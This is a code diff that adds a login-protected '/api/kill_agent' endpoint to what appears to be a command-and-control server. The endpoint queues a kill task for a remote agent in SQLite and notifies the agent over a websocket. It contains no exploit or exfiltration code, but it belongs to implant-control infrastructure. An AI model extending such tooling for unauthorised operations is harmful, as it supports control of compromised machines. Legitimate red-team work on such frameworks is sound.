@@ -781,3 +781,55 @@ def init_api_routes(app, socketio):
                 "status": "error",
                 "message": str(e)
             }), 500
+    @app.route('/api/kill_agent', methods=['POST'])
+    @login_required
+    def kill_agent():
+        conn = None
+        try:
+            data = request.get_json()
+            if not data or 'agent_id' not in data:
+                return jsonify({"status": "error", "message": "Agent ID required"}), 400
+                
+            agent_id = data['agent_id']
+            
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            
+            # Create a kill task for the agent
+            task_data = {
+                'kill': True,
+                'message': 'Kill command received from C2'
+            }
+            
+            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
+                    (None, agent_id, 'kill', 
+                    json.dumps(task_data),
+                    'pending', 
+                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), 
+                    None))
+            
+            conn.commit()
+            task_id = c.lastrowid
+            conn.close()
+            
+            # Notify agent via websocket
+            socketio.emit('new_task', {
+                'task_id': task_id,
+                'agent_id': agent_id,
+                'task_type': 'kill'
+            })
+            
+            return jsonify({
+                "status": "success",
+                "task_id": task_id,
+                "message": f"Kill command sent to agent {agent_id}"
+            })
+            
+        except Exception as e:
+            if conn:
+                conn.rollback()
+                conn.close()
+            return jsonify({
+                "status": "error",
+                "message": str(e)
+            }), 500
